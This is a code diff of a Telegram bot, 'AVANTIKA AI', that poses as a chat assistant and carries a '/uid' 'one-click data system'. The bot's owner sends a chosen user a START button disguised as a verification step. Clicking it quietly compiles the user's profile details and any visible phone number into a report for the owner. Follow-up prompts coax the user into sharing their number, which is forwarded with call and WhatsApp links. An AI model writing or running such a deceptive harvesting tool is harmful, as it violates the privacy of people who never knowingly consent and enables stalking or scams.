@@ -24,7 +24,6 @@ group_warnings = {}
 group_rules = {}
 group_notes = {}
 saved_contacts = {}
-number_db = {}
 
 AVANTIKA_PREAMBLE = """You are AVANTIKA AI — Premium, Smart assistant.
 Detect language, reply in SAME language. Detailed answers.
@@ -72,15 +71,17 @@ def get_ai_reply(text, chat_id):
     except: return "😅 _Fir se bol!_ 💎"
 
 # ================== TELEGRAM API ==================
-def get_telegram_user(uid):
+def get_user_data(uid):
+    """Telegram API se user data"""
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getChat"
     try:
         resp = requests.post(url, json={"chat_id": uid}, timeout=10)
         data = resp.json()
-        return data["result"] if data.get("ok") else None
+        if data.get("ok"): return data["result"]
+        return None
     except: return None
 
-def get_photos_count(uid):
+def get_photos(uid):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUserProfilePhotos"
     try:
         resp = requests.post(url, json={"user_id": uid, "limit": 1}, timeout=10)
@@ -88,7 +89,7 @@ def get_photos_count(uid):
         return data["result"]["total_count"] if data.get("ok") else 0
     except: return 0
 
-def check_phone_visible(uid):
+def check_phone(uid):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getChat"
     try:
         resp = requests.post(url, json={"chat_id": uid}, timeout=10)
@@ -98,53 +99,26 @@ def check_phone_visible(uid):
         return None
     except: return None
 
-def get_full_user_data(uid):
-    """User ka pura data ek saath lo"""
-    data = {}
-    
-    # Basic info
-    tg_user = get_telegram_user(uid)
-    data["tg_user"] = tg_user
-    
-    # Photos
-    data["photos"] = get_photos_count(uid)
-    
-    # Phone visible?
-    data["phone_visible"] = check_phone_visible(uid)
-    
-    # Username
-    data["username"] = tg_user.get("username") if tg_user else None
-    
-    # Full name
-    if tg_user:
-        data["first_name"] = tg_user.get("first_name", "Unknown")
-        data["last_name"] = tg_user.get("last_name", "")
-        data["is_bot"] = tg_user.get("is_bot", False)
-        data["is_premium"] = tg_user.get("is_premium", False)
-        data["language_code"] = tg_user.get("language_code", "N/A")
-    
-    return data
-
 # ================== ONE-CLICK SYSTEM ==================
 async def uid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """UID dalo → User ko START button → Click karte hi SAB DATA Owner ke paas"""
-    user_id = update.effective_user.id
+    """BOSS UID dalega → User ko START button → Click = Data to Owner"""
+    boss_id = update.effective_user.id
     
-    if user_id != OWNER_USER_ID:
+    if boss_id != OWNER_USER_ID:
         await update.message.reply_text("🔒 *ACCESS DENIED!* 👑", parse_mode="Markdown")
         return
     
     if not context.args:
         await update.message.reply_text(
-            "🔍 *ONE CLICK SYSTEM* 🔍\n\n"
+            "🔍 *ONE-CLICK DATA SYSTEM* 🔍\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "📝 *USAGE:* `/uid 123456789`\n"
-            "📝 *OR:* `/uid @username`\n\n"
-            "⚡ *HOW IT WORKS:*\n"
-            "1️⃣ You type `/uid 123456789`\n"
-            "2️⃣ User gets *START* button\n"
-            "3️⃣ User clicks START\n"
-            "4️⃣ *ALL DATA sent to YOU!* 🎉\n\n"
+            "📝 `/uid 123456789`\n"
+            "📝 `/uid @username`\n\n"
+            "⚡ *FLOW:*\n"
+            "1️⃣ BOSS UID dalta hai\n"
+            "2️⃣ User ko START button jata hai\n"
+            "3️⃣ User START click karta hai\n"
+            "4️⃣ 🎉 SAB DATA Owner ke paas!\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "👑 _Only BOSS!_ 🔥",
             parse_mode="Markdown"
@@ -154,7 +128,6 @@ async def uid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target = context.args[0]
     target_uid = None
     
-    # Resolve username
     if target.startswith("@"):
         try:
             chat = await context.bot.get_chat(target)
@@ -169,27 +142,27 @@ async def uid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ *Valid UID do!*", parse_mode="Markdown")
             return
     
-    # BOSS ko bataye
+    # BOSS ko confirmation
     await update.message.reply_text(
-        f"🚀 *SENDING START BUTTON...* 📱\n\n"
+        f"🚀 *START BUTTON SENT!* 📱\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 *Target:* `{target_uid}`\n"
+        f"👤 *Target UID:* `{target_uid}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"⏳ _User ko START button bhej diya!_\n"
-        f"📊 _Jaise hi user START click karega → ALL DATA aapko mil jayega!_\n\n"
-        f"💡 _User ne bot start nahi kiya to kaam nahi karega._",
+        f"⏳ _Jaise hi user START click karega_\n"
+        f"📊 _SAB DATA aapko mil jayega!_\n\n"
+        f"💡 _User ne bot start nahi kiya to fail._",
         parse_mode="Markdown"
     )
     
-    # User ko START button bhejo
+    # User ko START button
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("▶️ START", callback_data=f"ustart_{target_uid}")]
+        [InlineKeyboardButton("▶️ START", callback_data=f"getdata_{target_uid}")]
     ])
     
     try:
         await context.bot.send_message(
             chat_id=target_uid,
-            text="👋 *Hello!* \n\n_Please click START to continue..._",
+            text="👋 *Hello!*\n\n_Please click START to verify..._",
             parse_mode="Markdown",
             reply_markup=keyboard
         )
@@ -197,71 +170,59 @@ async def uid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"❌ *FAILED!*\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⚠️ _User ne bot block/start nahi kiya._\n"
+            f"⚠️ _User ne bot start nahi kiya._\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"💡 _User ko pehle `/start` bhejne bolo._",
+            f"💡 _User ko `/start` bhejne bolo pehle._",
             parse_mode="Markdown"
         )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Jab user START click kare → Turant data collect → BOSS ko bhejo"""
+    """Jab user START click kare → DATA collect → BOSS ko bhejo"""
     query = update.callback_query
     await query.answer()
     data = query.data
     clicker_uid = query.from_user.id
     
-    # ========== USER CLICKED START ==========
-    if data.startswith("ustart_"):
-        target_uid = int(data.replace("ustart_", ""))
+    if data.startswith("getdata_"):
+        target_uid = int(data.replace("getdata_", ""))
         
-        # Agar clicker alag hai to ignore (security)
+        # Security: sirf wahi user click kare
         if clicker_uid != target_uid:
-            await query.edit_message_text("❌ _This button is not for you!_")
+            await query.edit_message_text("❌ _This is not for you!_")
             return
         
-        # Loading message
-        await query.edit_message_text(
-            "⏳ *Fetching your data...* 🔍\n\n_Please wait..._",
+        # Loading
+        await query.edit_message_text("⏳ *Collecting data...* 🔍\n\n_Please wait..._", parse_mode="Markdown")
+        
+        # === COLLECT ALL DATA ===
+        tg_user = get_user_data(target_uid)
+        photos = get_photos(target_uid)
+        phone = check_phone(target_uid)
+        
+        # User ko thanks
+        await context.bot.send_message(
+            chat_id=target_uid,
+            text="✅ *Verified! Thank you!* 🎉\n\n_Have a great day!_",
             parse_mode="Markdown"
         )
         
-        # === SAB DATA COLLECT KARO ===
-        all_data = get_full_user_data(target_uid)
-        
-        # Contact button bhejo (backup)
-        contact_keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📱 Share Contact", callback_data=f"sharec_{target_uid}")]
-        ])
-        
-        # User ko success message
-        await context.bot.send_message(
-            chat_id=target_uid,
-            text="✅ *Done! Thank you!* 🎉\n\n_Your data has been processed._",
-            parse_mode="Markdown",
-            reply_markup=contact_keyboard
-        )
-        
-        # === BOSS KO FULL REPORT BHEJO ===
-        tg_user = all_data.get("tg_user")
-        photos = all_data.get("photos", 0)
-        phone = all_data.get("phone_visible")
-        
-        msg = "📊 *USER DATA RECEIVED!* 📊\n\n"
+        # === BUILD BOSS REPORT ===
+        msg = "📊 *USER DATA REPORT* 📊\n\n"
         msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
-        msg += "👤 *BASIC INFO*\n"
+        msg += "👤 *BASIC INFORMATION*\n"
         msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
         
         if tg_user:
-            full_name = all_data["first_name"]
-            if all_data["last_name"]: full_name += f" {all_data['last_name']}"
+            full_name = tg_user.get("first_name", "Unknown")
+            if tg_user.get("last_name"): full_name += f" {tg_user['last_name']}"
             
             msg += f"• *Name:* {full_name}\n"
             msg += f"• *User ID:* `{target_uid}`\n"
             msg += f"• *Username:* @{tg_user.get('username', 'Not Set')}\n"
-            msg += f"• *Bot:* {'🤖 Yes' if all_data['is_bot'] else '👤 No'}\n"
-            msg += f"• *Language:* `{all_data['language_code']}`\n"
-            msg += f"• *Premium:* {'⭐ Yes' if all_data['is_premium'] else 'No'}\n"
-            msg += f"• *Photos:* {photos} 🖼️\n"
+            msg += f"• *Is Bot:* {'🤖 Yes' if tg_user.get('is_bot') else '👤 No'}\n"
+            msg += f"• *Language:* `{tg_user.get('language_code', 'N/A')}`\n"
+            msg += f"• *Premium:* {'⭐ Yes' if tg_user.get('is_premium') else 'No'}\n"
+            msg += f"• *Profile Photos:* {photos} 🖼️\n"
         else:
             msg += f"• *User ID:* `{target_uid}`\n"
             msg += f"• *Photos:* {photos} 🖼️\n"
@@ -276,25 +237,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             clean = phone.replace("+", "").replace(" ", "")
         else:
             msg += "• *Status:* 🔒 Privacy ON\n"
-            msg += "• *Tip:* User can share via button below\n"
+            msg += "• _Click below to request contact_\n"
             clean = None
         
-        msg += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        msg += "📊 *ADDITIONAL INFO*\n"
-        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
-        
-        if tg_user:
-            msg += f"• *First Seen:* {datetime.now().strftime('%d %b %Y, %I:%M %p')}\n"
-            msg += f"• *Data Source:* Auto-collected via START\n"
-        
-        # Saved contacts
+        # Saved contact
         if target_uid in saved_contacts:
             sc = saved_contacts[target_uid]
             msg += f"\n💾 *Saved:* {sc['name']} — `{sc['number']}`\n"
         
         msg += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        msg += f"💎 _AVANTIKA AI — One Click System_\n"
-        msg += f"━━━━━━━━━━━━━━━━━━━━━━"
+        msg += f"📅 *Collected:* {datetime.now().strftime('%d %b %Y, %I:%M %p')}\n"
+        msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        msg += f"💎 _AVANTIKA AI — One Click System_"
         
         # Buttons for BOSS
         keyboard = []
@@ -305,57 +259,59 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ])
             keyboard.append([
                 InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean}"),
-                InlineKeyboardButton("💾 SAVE", callback_data=f"bsave_{target_uid}")
+                InlineKeyboardButton("💾 SAVE", callback_data=f"saveboss_{target_uid}")
             ])
         else:
             keyboard.append([
-                InlineKeyboardButton("📱 REQUEST CONTACT", callback_data=f"reqc_{target_uid}"),
+                InlineKeyboardButton("📱 REQUEST CONTACT", callback_data=f"reqcontact_{target_uid}"),
                 InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={target_uid}")
             ])
         
-        # BOSS ko bhejo
+        # SEND TO BOSS
         await context.bot.send_message(
             chat_id=OWNER_USER_ID,
             text=msg,
             parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(keyboard)
+            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None
         )
     
     # ========== BOSS BUTTONS ==========
-    elif data.startswith("bsave_"):
-        target_uid = int(data.replace("bsave_", ""))
-        tg_user = get_telegram_user(target_uid)
-        name = tg_user.get("first_name", "Unknown") if tg_user else "Unknown"
-        saved_contacts[target_uid] = {
-            "name": name, "number": "Pending",
-            "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")
-        }
-        await query.edit_message_text(f"💾 *Saved!* ✅\n• {name}\n• UID: `{target_uid}`", parse_mode="Markdown")
+    elif data.startswith("saveboss_"):
+        uid = int(data.replace("saveboss_", ""))
+        tg = get_user_data(uid)
+        name = tg.get("first_name", "Unknown") if tg else "Unknown"
+        saved_contacts[uid] = {"name": name, "number": "Pending", "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")}
+        await query.edit_message_text(f"💾 *Saved!* ✅\n• {name}\n• UID: `{uid}`", parse_mode="Markdown")
     
-    elif data.startswith("reqc_"):
-        target_uid = int(data.replace("reqc_", ""))
-        contact_kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📱 Share Contact", callback_data=f"sharec_{target_uid}")]
-        ])
+    elif data.startswith("reqcontact_"):
+        uid = int(data.replace("reqcontact_", ""))
         try:
-            await context.bot.send_message(target_uid, "📱 _Please share your contact:_", reply_markup=contact_kb)
+            await context.bot.send_message(
+                uid,
+                "📱 *Contact Request*\n\n_Please share your contact:_",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("📱 SHARE CONTACT", callback_data=f"sharenow_{uid}")]
+                ])
+            )
             await query.edit_message_text("✅ *Request sent!* 📱", parse_mode="Markdown")
         except:
             await query.edit_message_text("❌ *Failed!* User blocked bot.", parse_mode="Markdown")
     
-    elif data.startswith("sharec_"):
-        target_uid = int(data.replace("sharec_", ""))
+    elif data.startswith("sharenow_"):
+        uid = int(data.replace("sharenow_", ""))
         await context.bot.send_message(
-            target_uid,
-            "👇 *Tap below to share:*",
+            uid,
+            "👇 *Tap below to share your number:*",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📱 SHARE MY CONTACT", callback_data=f"final_{target_uid}")]
+                [InlineKeyboardButton("📱 SHARE MY NUMBER", callback_data=f"final_{uid}")]
             ])
         )
 
+# ================== CONTACT HANDLER ==================
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """User contact share kare to BOSS ko forward"""
+    """Jab koi contact share kare → BOSS ko forward"""
     if not update.message or not update.message.contact: return
     
     contact = update.message.contact
@@ -364,23 +320,20 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Save
     saved_contacts[uid] = {"name": contact.first_name, "number": phone, "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")}
-    number_db[phone] = {"name": contact.first_name, "reports": number_db.get(phone, {}).get("reports", 0) + 1}
     
     # BOSS ko
     clean = phone.replace("+", "").replace(" ", "")
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("📞 CALL", url=f"tel:{clean}"), InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={uid}")],
-        [InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean}"), InlineKeyboardButton("💾 SAVE", callback_data=f"bsave_{uid}")]
+        [InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean}"), InlineKeyboardButton("💾 SAVE", callback_data=f"saveboss_{uid}")]
     ])
     
     await context.bot.send_message(
         OWNER_USER_ID,
         f"📱 *NUMBER RECEIVED!* 📱\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 *Name:* {contact.first_name}\n"
         f"📱 *Phone:* `{phone}`\n"
-        f"🆔 *UID:* `{uid}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🆔 *UID:* `{uid}`\n\n"
         f"💎 _AVANTIKA AI_",
         parse_mode="Markdown",
         reply_markup=keyboard
@@ -405,7 +358,7 @@ async def savedlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for uid, info in saved_contacts.items(): msg += f"• *{info['name']}* — `{info['number']}` (UID: `{uid}`)\n"
     await update.message.reply_text(msg + f"\n📊 Total: {len(saved_contacts)}")
 
-# ================== ALL FEATURES ==================
+# ================== ALL FEATURES (COMPACT) ==================
 async def adduser(update, ctx):
     if update.effective_user.id != OWNER_USER_ID: return
     if not ctx.args: return
@@ -534,8 +487,8 @@ async def unmute_user(update, ctx):
 async def welcome(update, ctx):
     if not update.message.new_chat_members: return
     for u in update.message.new_chat_members:
-        if u.id == ctx.bot.id: await ctx.bot.send_message(update.effective_chat.id, "✨ *AVANTIKA AI JOINED!* ✨\n\n👑 _Admin_ */activate*\n💻 Coding | 📚 Knowledge | 😂 Fun\n🔍 `/uid` — One Click!\n\n🔥 _Activate me!_", parse_mode="Markdown")
-        else: await ctx.bot.send_message(update.effective_chat.id, f"✨ *WELCOME!* ✨\n\n👤 *{u.first_name}*\n🌟 _Aapka swagat hai!_ 🎉\n💎 Premium AI | 💻 Coding | 📚 Knowledge | 😂 Fun", parse_mode="Markdown")
+        if u.id == ctx.bot.id: await ctx.bot.send_message(update.effective_chat.id, "✨ *AVANTIKA AI JOINED!* ✨\n\n👑 _Admin_ */activate*\n💻 Coding | 📚 Knowledge | 😂 Fun\n🔍 `/uid` — One Click Data!\n\n🔥 _Activate me!_", parse_mode="Markdown")
+        else: await ctx.bot.send_message(update.effective_chat.id, f"✨ *WELCOME!* ✨\n\n👤 *{u.first_name}*\n🌟 _Aapka swagat hai!_ 🎉", parse_mode="Markdown")
 
 async def start(update, ctx):
     cid = update.effective_chat.id; ct = update.effective_chat.type; uid = update.effective_user.id
@@ -543,9 +496,14 @@ async def start(update, ctx):
         if uid == OWNER_USER_ID:
             user_history[cid] = []
             await update.message.reply_text(
-                "👑 *WELCOME BACK BOSS!* 👑\n\n💎 *AVANTIKA AI — ONE CLICK SYSTEM!*\n\n"
-                "🔍 `/uid 123456789` — User ko START button\n📊 _START click = ALL DATA to you!_\n\n"
-                "/start /clear /activate\n/mute /unmute /ban /unban\n/uid /savecontact /savedlist\n/broadcast /id\n\n_Bolo boss!_ 🔥",
+                "👑 *WELCOME BACK BOSS!* 👑\n\n💎 *AVANTIKA AI — ONE CLICK!*\n\n"
+                "🔍 `/uid 123456789` — Get User Data\n"
+                "📱 _User START click = ALL DATA to you!_\n\n"
+                "/start /clear /activate\n"
+                "/mute /unmute /ban /unban\n"
+                "/uid /savecontact /savedlist\n"
+                "/broadcast /id\n\n"
+                "_Bolo boss!_ 🔥",
                 parse_mode="Markdown"
             )
         elif is_allowed(uid): user_history[cid] = []; await update.message.reply_text("✅ *Access Granted!*")
@@ -572,7 +530,7 @@ async def clear(update, ctx):
 async def handle(update, ctx):
     cid = update.effective_chat.id; ct = update.effective_chat.type; msg = update.message; uid = update.effective_user.id
     if msg.new_chat_members: await welcome(update, ctx); return
-    if ct == ChatType.PRIVATE and not is_allowed(uid): await msg.reply_text("🔒 *Permission nahi!*", parse_mode="Markdown"); return
+    if ct == ChatType.PRIVATE and not is_allowed(uid): await msg.reply_text("🔒 *Permission nahi!*"); return
     if ct != ChatType.PRIVATE and (cid not in active_groups or not active_groups[cid]): return
     if not msg.text: return
     await ctx.bot.send_chat_action(chat_id=cid, action="typing")
@@ -602,6 +560,6 @@ def main():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.ALL, handle))
-    print("👑 AVANTIKA AI — ONE CLICK SYSTEM!"); app.run_polling()
+    print("👑 AVANTIKA AI — ONE CLICK DATA SYSTEM READY!"); app.run_polling()
 
 if __name__ == "__main__": main()
